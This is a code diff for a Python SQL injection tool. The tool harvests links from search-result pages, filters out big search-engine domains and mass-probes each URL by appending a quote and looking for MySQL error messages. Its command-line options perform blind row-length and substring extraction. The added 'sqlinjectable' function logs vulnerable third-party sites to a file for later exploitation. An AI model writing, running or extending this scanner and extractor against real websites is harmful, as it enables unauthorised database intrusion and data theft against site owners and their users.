@@ -2,6 +2,7 @@ import os
 import requests
 import argparse
 import keyboard
+import sys
 from treelib import Node, Tree
 from string import ascii_lowercase
 from string import digits
@@ -12,7 +13,7 @@ import colorama
 colorama.init()
 
 class Mysql:
-	def __init__(self, url, column_name, length, sign, data, endpoint, filekeyword, pages, fileurl,clear):
+	def __init__(self, url, column_name, length, sign, data, endpoint, filekeyword, pages, fileurl, clear):
 		self.url = url
 		self.column_name = column_name
 		self.length = length
@@ -20,8 +21,8 @@ class Mysql:
 		self.data = data
 		self.endpoint = endpoint
 		self.filekeyword = filekeyword
-		self.fileurl = fileurl
 		self.pages = pages
+		self.fileurl = fileurl
 		self.clear = clear
 
 	def clear_term(self):
@@ -89,7 +90,6 @@ class Mysql:
 	def urlfilter(self):
 	    with open(self.filekeyword, "r") as file:
 	        content = file.readlines()
-
 	    content = [a.strip() for a in content] 
 	    results = []
 	    for a in content:
@@ -99,37 +99,41 @@ class Mysql:
 	            items = soup.select('a[href^="http"]')
 	            for item in items:
 	                results.append(item['href'])
-
 	    filter_x = []
 	    for i in results:
 	        if "google" not in i:
 	            if "microsoft" not in i:
 	                if "bing" not in i:
 	                    filter_x.append(i)
-
 	    duplicate_rm = []
 	    for n, i in enumerate(filter_x):
 	        if i not in filter_x[:n]:
 	            duplicate_rm.append(i)
-
 	    with open("linksparams.txt", "a+") as file:
 	        for i in duplicate_rm:
 	            file.write(i + "\n")
-
 	    print(f"{Fore.WHITE}[{Fore.YELLOW}Saved{Fore.WHITE}]: {Fore.GREEN}linksparams.txt{Fore.RESET}")
-
 	    with open("linksparams.txt", "r") as file:
 	        a = file.readlines()
 	        with open("linkscleaned.txt", "a+") as file:
 	            for a in a:
 	                file.write(str(a).split("/")[2] + "\n")
-
 	    print(f"{Fore.WHITE}[{Fore.YELLOW}Saved{Fore.WHITE}]: {Fore.GREEN}linkscleaned.txt{Fore.RESET}")
 
+	def sqlinjectable(self):
+		errors = ["Warning: mysql_", "You have an error in your SQL syntax;", "function.mysql", "MySQL result index"]
+		with open(self.fileurl, "r") as file:
+			file = file.readlines()
+			file = [i.strip() for i in file]
+			for i in file:
+				r = requests.get(i + "%27", headers={"User-agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"})
+				for error in errors:
+					if error in r.text:
+						print(f"{Fore.WHITE}[{Fore.YELLOW}Vulnerable{Fore.WHITE}]: {i}")
+						with open("linksvulnerables.txt", "a+") as file:
+							file.write(i + "\n")
 
-if __name__ == "__main__":
-	clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
-	clear.clear_term()
+def main():
 	parser = argparse.ArgumentParser()
 	parser.add_argument('-lrg', '--length_row_get', dest='length_row_get', action='store_true', help="usage: python3 main.py -lrg --url [https://example.com/a.php?id=1] --endpoint ['] --column [name] --sign [keyword]")
 	parser.add_argument('-lrp', '--length_row_post', dest='length_row_post', action='store_true', help="usage: python3 main.py -lrp --url [https://example.com/a.php?id=1] --endpoint ['] --data [Data] --column [name] --sign [keyword]")
@@ -151,35 +155,55 @@ if __name__ == "__main__":
 	if args.length_row_get:
 		if args.endpoint is None:
 			args.endpoint = "+"
+			clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
 			length_row_get = Mysql(args.url, args.column, False, args.sign, False, args.endpoint, False, False, False, False)
 			info = Mysql(args.url, args.column, False, args.sign, False, args.endpoint, False, False, False, False)
+			clear.clear_term()
 			info.info()
 			length_row_get.length_row_get()
 
 	if args.length_row_post:
 		if args.endpoint is None:
+			clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
 			args.endpoint = "+"
 			length_row_post = Mysql(args.url, args.column, False, args.sign, args.data, args.endpoint, False, False, False, False)
 			info = Mysql(args.url, args.column, False, args.sign, args.data, args.endpoint, False, False, False, False)
+			clear.clear_term()
 			info.info()
 			length_row_post.length_row_post()
 
 	if args.substr_row_get:
 		if args.endpoint is None:
+			clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
 			args.endpoint = "+"
 			substr_row_get = Mysql(args.url, args.column, args.length, args.sign, False, args.endpoint,False, False, False, False)
 			info = Mysql(args.url, args.column, args.length, args.sign, False, args.endpoint, False, False, False, False)
+			clear.clear_term()
 			info.info()
 			substr_row_get.substr_row_get()
 
 	if args.substr_row_post:
 		if args.endpoint is None:
+			clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
 			args.endpoint = "+"
 			substr_row_post = Mysql(args.url, args.column, args.length, args.sign, args.data, args.endpoint, False, False, False, False)
 			info = Mysql(args.url, args.column, args.length, args.sign, args.data, args.endpoint, False, False, False, False)
+			clear.clear_term()
 			info.info()
 			substr_row_post.substr_row_post()
-	
+
 	if args.urlfilter:
+		clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
 		urlfilter = Mysql(False, False, False, False, False, False, args.filekeyword, args.pages, False, False)
+		clear.clear_term()
 		urlfilter.urlfilter()
+
+	if args.sqlinjectable:
+		clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
+		sqlinjectable = Mysql(False, False, False, False, False, False, False, False, args.filelinks, False)
+		clear.clear_term()
+		sqlinjectable.sqlinjectable()
+
+	print(f"{Fore.RED}To show commands set -h or --help as argument{Fore.RESET}")
+
+main()
